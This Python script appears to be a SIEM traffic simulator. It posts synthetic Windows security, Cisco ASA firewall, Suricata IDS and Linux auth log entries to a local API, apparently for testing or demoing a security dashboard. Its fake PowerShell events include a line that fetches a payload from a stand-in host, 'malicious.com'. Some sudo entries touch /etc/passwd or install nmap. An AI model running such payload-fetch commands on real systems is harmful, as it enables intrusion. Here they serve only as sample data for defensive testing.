import requests
import json
import time
import random
import datetime
import uuid
import sys
import signal

# Configuration
API_URL = "http://localhost:3001/api/logs"
INTERVAL_MIN = 0.5  # Seconds
INTERVAL_MAX = 3.0  # Seconds

# -------------------------------------------------------------------------
# REALISTIC DATASETS
# -------------------------------------------------------------------------

AGENTS = [
    {"name": "Win-DC01", "ip": "10.0.0.5", "os": "Windows Server 2022", "type": "wazuh-agent"},
    {"name": "Win-FileServer", "ip": "10.0.0.6", "os": "Windows Server 2019", "type": "wazuh-agent"},
    {"name": "Ubuntu-Web01", "ip": "10.0.0.20", "os": "Ubuntu 22.04 LTS", "type": "wazuh-agent"},
    {"name": "Gateway-Firewall", "ip": "192.168.1.1", "os": "Cisco ASA", "type": "firewall"},
    {"name": "Core-Switch", "ip": "192.168.1.2", "os": "Cisco IOS", "type": "network"},
    {"name": "Suricata-IDS", "ip": "10.0.0.100", "os": "Suricata", "type": "ids"},
]

EXTERNAL_IPS = [
    "45.2.1.12", "185.33.22.10", "220.12.55.99", "1.1.1.1", "8.8.8.8", "210.10.10.2", "198.51.100.23"
]

USERS = ["admin", "jsmith", "bwayne", "pve", "system", "service_account"]

# -------------------------------------------------------------------------
# EVENT TEMPLATES
# -------------------------------------------------------------------------

def gen_windows_event(agent):
    """Simulates a Windows Security Event log via Wazuh"""
    event_type = random.choice(["Login Success", "Login Failed", "Process Creation", "PowerShell"])
    user = random.choice(USERS)
    
    if event_type == "Login Success":
        evt_id = 4624
        level = "INFO"
        msg = f"An account was successfully logged on. Subject: Security ID: S-1-5-18, Account Name: {agent['name']}$. Account Name: {user}, Logon Type: 3."
    elif event_type == "Login Failed":
        evt_id = 4625
        level = "WARN"
        src_ip = random.choice(EXTERNAL_IPS)
        msg = f"An account failed to log on. Account Name: {user}. Failure Reason: Unknown user name or bad password. Source Network Address: {src_ip}."
    elif event_type == "Process Creation":
        evt_id = 4688
        level = "INFO"
        proc = random.choice(["cmd.exe", "powershell.exe", "svchost.exe", "lsass.exe"])
        msg = f"A new process has been created. Creator Subject: Account Name: {user}. New Process Name: C:\\Windows\\System32\\{proc}."
    else: # PowerShell
        evt_id = 4104
        level = "WARN"
        script = random.choice(["Invoke-WebRequest", "Get-Process", "Net-User"])
        msg = f"Script Block ID: {uuid.uuid4()}. Executing: {script} http://malicious.com/payload.ps1"
        if "malicious" in msg:
            level = "ERROR"

    return {
        "service": list(filter(lambda x: x["type"] == "wazuh-agent", AGENTS))[0]["name"], # Use specific agent or random? Let's use passed agent
        "level": level,
        "message": f"WinEvtLog: Security: EVENT_ID({evt_id}): Microsoft-Windows-Security-Auditing: {user}: {agent['name']}: {msg}",
        "meta": {
            "agent_name": agent["name"],
            "event_id": evt_id,
            "category": "Windows Security"
        }
    }

def gen_firewall_log(agent):
    """Simulates a Cisco ASA or generic firewall log"""
    action = random.choice(["Allowed", "Denied", "Teardown"])
    proto = random.choice(["TCP", "UDP", "ICMP"])
    src_ip = random.choice(EXTERNAL_IPS) if random.random() > 0.5 else "10.0.0.50"
    dst_ip = agent["ip"]
    src_port = random.randint(1024, 65535)
    dst_port = random.choice([80, 443, 22, 3389, 445])
    
    level = "INFO"
    if action == "Denied":
        level = "WARN"
        if dst_port in [22, 3389, 445]:
            level = "ERROR" # Blocked critical port scan
            
    msg = f"%ASA-6-302013: Built {action.lower()} {proto} connection {random.randint(10000,99999)} for outside:{src_ip}/{src_port} ({src_ip}/{src_port}) to inside:{dst_ip}/{dst_port} ({dst_ip}/{dst_port})"
    
    return {
        "service": agent["name"],
        "level": level,
        "message": msg,
        "meta": {
             "protocol": proto,
             "action": action,
             "src_ip": src_ip,
             "dst_port": dst_port
        }
    }

def gen_ids_alert(agent):
    """Simulates a Suricata/Snort IDS alert"""
    threats = [
        {"msg": "ET SCAN MSSQL Service default port 1433", "cat": "Attempted Information Leak", "pri": 2},
        {"msg": "ET MALWARE Win32/Spybot.Worm.Variant Data", "cat": "A Network Trojan was detected", "pri": 1},
        {"msg": "GPL ATTACK_RESPONSE id check returned root", "cat": "Potentially Bad Traffic", "pri": 2},
        {"msg": "ET WEB_SERVER Possible SQL Injection Attempt", "cat": "Web Application Attack", "pri": 1}
    ]
    
    threat = random.choice(threats)
    src_ip = random.choice(EXTERNAL_IPS)
    dst_ip = "10.0.0.20" # Web server
    
    level = "WARN"
    if threat["pri"] == 1:
        level = "ERROR"
        
    log_msg = f"[**] [1:{random.randint(2000000, 2999999)}:1] {threat['msg']} [**] [Classification: {threat['cat']}] [Priority: {threat['pri']}] {{TCP}} {src_ip}:{random.randint(1024,65535)} -> {dst_ip}:80"

    return {
        "service": agent["name"],
        "level": level,
        "message": log_msg,
        "meta": {
            "category": "Intrusion Detection",
            "threat_name": threat["msg"],
            "priority": threat["pri"],
            "attacker_ip": src_ip
        }
    }

def gen_syslog(agent):
    """Simulates a generic Linux Syslog/Auth.log"""
    proc = random.choice(["sshd", "sudo", "cron", "systemd"])
    pid = random.randint(1000, 9999)
    
    if proc == "sshd":
        user = random.choice(USERS + ["root", "invalid_user"])
        src_ip = random.choice(EXTERNAL_IPS)
        status = random.choice(["Accepted publickey", "Failed password", "Invalid user"])
        msg = f"{proc}[{pid}]: {status} for {user} from {src_ip} port {random.randint(1024,65535)} ssh2"
        level = "INFO"
        if status != "Accepted publickey":
            level = "WARN"
            if user == "root":
                level = "ERROR"
    elif proc == "sudo":
        user = random.choice(USERS)
        cmd = random.choice(["/bin/bash", "/usr/bin/vim /etc/passwd", "apt-get install nmap"])
        msg = f"{proc}[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"
        level = "INFO"
        if "passwd" in cmd:
            level = "WARN"
    else:
        msg = f"{proc}[{pid}]: Service status checks completed."
        level = "DEBUG"

    return {
        "service": agent["name"],
        "level": level,
        "message": msg,
        "meta": {
            "process": proc,
            "pid": pid
        }
    }

# -------------------------------------------------------------------------
# MAIN LOOP
# -------------------------------------------------------------------------

def send_log(payload):
    try:
        # Add common timestamp
        payload["timestamp"] = datetime.datetime.utcnow().isoformat() + "Z"
        
        headers = {'Content-Type': 'application/json'}
        response = requests.post(API_URL, data=json.dumps(payload), headers=headers, timeout=2)
        
        if response.status_code in [200, 201]:
            print(f"[+] Sent {payload['level']} log from {payload['service']}")
        else:
            print(f"[-] Status {response.status_code}: {response.text}")
            
    except Exception as e:
        print(f"[!] Error sending log: {e}")

def main():
    print(f"[*] Starting SIEM Traffic Simulator...")
    print(f"[*] Target API: {API_URL}")
    print(f"[*] Press Ctrl+C to stop.")
    
    try:
        while True:
            # Pick a random agent
            agent = random.choice(AGENTS)
            
            # Generate log based on agent type
            if agent["type"] == "wazuh-agent":
                # 70% Windows Event, 30% Syslog style if it was linux (but mixed here for demo)
                if "Windows" in agent["os"]:
                    payload = gen_windows_event(agent)
                else:
                    payload = gen_syslog(agent)
            
            elif agent["type"] == "firewall":
                payload = gen_firewall_log(agent)
                
            elif agent["type"] == "ids":
                payload = gen_ids_alert(agent)
                
            else:
                payload = gen_syslog(agent)

            send_log(payload)
            
            # Sleep random interval
            time.sleep(random.uniform(INTERVAL_MIN, INTERVAL_MAX))

    except KeyboardInterrupt:
        print("\n[*] Stopping simulator.")
        sys.exit(0)

if __name__ == "__main__":
    main()
